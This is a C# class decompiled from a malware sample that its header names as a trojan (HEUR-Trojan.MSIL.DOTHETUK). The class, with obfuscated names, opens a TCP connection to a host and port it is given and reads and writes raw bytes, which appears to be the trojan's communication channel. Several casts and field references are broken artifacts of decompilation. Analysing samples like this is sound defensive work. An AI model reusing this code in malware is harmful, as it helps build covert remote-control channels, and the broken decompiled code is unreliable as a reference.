// Decompiled with JetBrains decompiler
// Type: aO8BSlP.PEVgeMN
// Assembly: aO8BSlP, Version=2.0.0.0, Culture=neutral, PublicKeyToken=0a613f4dd989e8ae
// MVID: 26D80EA7-FF8D-466E-8999-D26AD81041E3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.DOTHETUK.gen-37c04e3821fcaedfc79bce018910dfdb141a491f2e2e18102353a3e3e74ebde6.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;

namespace aO8BSlP
{
  internal class PEVgeMN
  {
    private NetworkStream xreB3YC;
    public byte[] Ei3M8cS;

    public string KHYuRgo
    {
      [CompilerGenerated, SpecialName] get => ((PEVgeMN) this).CLdx22y;
      private set => this.CLdx22y = value;
    }

    public int YdioLuX { get; private set; }

    public PEVgeMN(string host, int port)
    {
      this.KHYuRgo = host;
      this.YdioLuX = port;
      ((aqUTJw5) this).M0xu1Im = (TcpClient) null;
      this.xreB3YC = (NetworkStream) null;
    }

    public void \u0037LC4bD0()
    {
      try
      {
        this.MYW7CN9();
      }
      catch (Exception ex)
      {
      }
      ((aqUTJw5) this).M0xu1Im = new TcpClient();
      ((aqUTJw5) this).M0xu1Im.NoDelay = true;
      IAsyncResult asyncResult = ((aqUTJw5) this).M0xu1Im.BeginConnect(((\u0036s75b5n) this).get_Host(), this.YdioLuX, (AsyncCallback) null, (object) null);
      WaitHandle asyncWaitHandle = asyncResult.AsyncWaitHandle;
      try
      {
        if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5.0), false))
        {
          ((aqUTJw5) this).M0xu1Im.Close();
          throw new IOException("Connection timoeut.", (Exception) new TimeoutException());
        }
        ((aqUTJw5) this).M0xu1Im.EndConnect(asyncResult);
      }
      finally
      {
        asyncWaitHandle.Close();
      }
      this.xreB3YC = ((aqUTJw5) this).M0xu1Im.GetStream();
      this.xreB3YC.ReadTimeout = 10000;
      this.xreB3YC.WriteTimeout = 10000;
    }

    public void MYW7CN9()
    {
      try
      {
        if (((aqUTJw5) this).M0xu1Im == null)
          throw new IOException("Not connected.", (Exception) new NullReferenceException());
        ((aqUTJw5) this).M0xu1Im.Close();
      }
      catch (Exception ex)
      {
      }
      finally
      {
        ((aqUTJw5) this).M0xu1Im = (TcpClient) null;
      }
    }

    public void grVjHLa()
    {
      if (this.xreB3YC == null)
        throw new IOException("Not connected.", (Exception) new NullReferenceException());
      this.xreB3YC.Flush();
    }

    public void aO7wQuD(byte[] iqphFVY, uint x74qPjN, ref uint _param3)
    {
      try
      {
        int offset = 0;
        if (this.xreB3YC == null)
          throw new IOException("Not connected.", (Exception) new NullReferenceException());
        _param3 = 0U;
        int num;
        for (; x74qPjN > 0U; x74qPjN -= (uint) num)
        {
          num = this.xreB3YC.Read(iqphFVY, offset, (int) x74qPjN);
          if (num < 0)
            break;
          _param3 += (uint) num;
          offset += num;
        }
      }
      catch (ObjectDisposedException ex)
      {
        throw new IOException("Connection closed.", (Exception) ex);
      }
    }

    public void \u0031flHLkD(byte[] HZQwdGu, int zdQve4L, ref uint Eu0xSpZ)
    {
      try
      {
        if (this.xreB3YC == null)
          throw new IOException("Not connected.", (Exception) new NullReferenceException());
        this.xreB3YC.Write(HZQwdGu, 0, zdQve4L);
        Eu0xSpZ = zdQve4L < 0 ? 0U : (uint) zdQve4L;
        this.xreB3YC.Flush();
      }
      catch (ObjectDisposedException ex)
      {
        throw new IOException("Connection closed.", (Exception) ex);
      }
    }

    public static ushort FZ0GLKy(ushort jQ4wPms) => BitConverter.IsLittleEndian ? (ushort) ((65280 & (int) jQ4wPms) >> 8 | ((int) byte.MaxValue & (int) jQ4wPms) << 8) : jQ4wPms;
  }
}
